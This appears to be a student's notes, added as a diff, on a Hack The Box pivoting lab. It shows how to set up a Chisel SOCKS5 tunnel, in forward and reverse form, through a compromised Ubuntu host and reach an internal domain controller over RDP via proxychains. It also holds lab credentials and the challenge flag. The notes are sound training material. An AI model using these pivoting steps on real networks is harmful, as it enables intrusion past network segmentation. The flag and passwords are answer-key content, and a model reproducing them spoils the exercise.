@@ -1,0 +1,96 @@
+So Chisel is actually a tool ive used (not very well) on THM boxes and labs so this one is important 
+
+Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 network (internal network).
+
+We have the Domain Controller with the address 172.16.5.19. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.
+
+Setting Up & Using Chisel
+Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
+
+HOST MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
+
+Building chisel
+
+HOST MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ cd chisel
+go build
+
+Once the binary is built, we can use SCP to transfer it to the target pivot host.
+
+Transferring Chisel Binary to Pivot Host 
+
+HOST MACHINE SYNTAX: scp chisel ubuntu@10.129.202.64:~/
+ 
+ubuntu@10.129.202.64's password: 
+chisel                                        100%   11MB   1.2MB/s   00:09  
+
+Running the Chisel Server on Pivot Host
+
+PIVOT MACHINE SYNTAX: ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+
+2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
+
+The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
+
+We can start a client on our attack host and connect to the Chisel server.
+
+Connecting to the Chisel Server from HOST MACHINE 
+
+HOST MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+
+2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/05/05 14:21:18 client: tun: Bound proxies
+2022/05/05 14:21:19 client: Handshaking...
+2022/05/05 14:21:19 client: Sending config
+2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+2022/05/05 14:21:19 client: tun: SSH connected
+
+NOW we can proxychain to the DC -> make sure /etc/proxychains.conf is configured for SOCKS5 -> socks5 127.0.0.1 1080 
+
+PROXYCHAIN SYNTAX FROM HOST MACHINE: MJBUCKNER@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+IF we were to reverse this it would look like: 
+
+HOST MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
+
+PIVOT MACHINE SYNTAX: ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+
+Again make sure /etc/proxychains.conf is configured -> 
+Syntax: MJBUCKNER@htb[/htb]$ tail -f /etc/proxychains.conf 
+
+[ProxyList]
+# add proxy here ...
+# socks4    127.0.0.1 9050
+socks5 127.0.0.1 1080  
+
+If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+HOST MACHINE SYNTAX: MJBUCKNER@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+Challenge - SSH to 10.129.118.194 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"
+
+Question 1 - Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.
+
+Pre-req -> sudo nano /etc/proxychains.conf -> add socks5   127.0.0.1 1080 at bottom
+1) HOST MACHINE - locate chisel 
+2) in new terminal ssh ubuntu@10.129.118.194
+3) back on HOST MACHINE - cd /usr/bin -> where chisel is located 
+4) scp chisel ubuntu@10.129.118.194:~/
+5) on UBUNTU SSH SESSION -> chmod +x chisel 
+6) ON UBUNTU SSH SESSION -> ./chisel server -v -p 1234 --socks5
+7) ON HOST MACHINE -> chisel client -v 10.129.118.194:1234 socks
+8) both machines should be connected now via chisel tunnel 
+9) NEW TERMINAL ON HOST MACHINE -> proxychains xfreerdp /v:10.129.118.194 /u:victor /p:pass@123 
+10) go to C:\Users\victor\Documents\flag.txt -> Th3$eTunne1$@rent8oring!
+
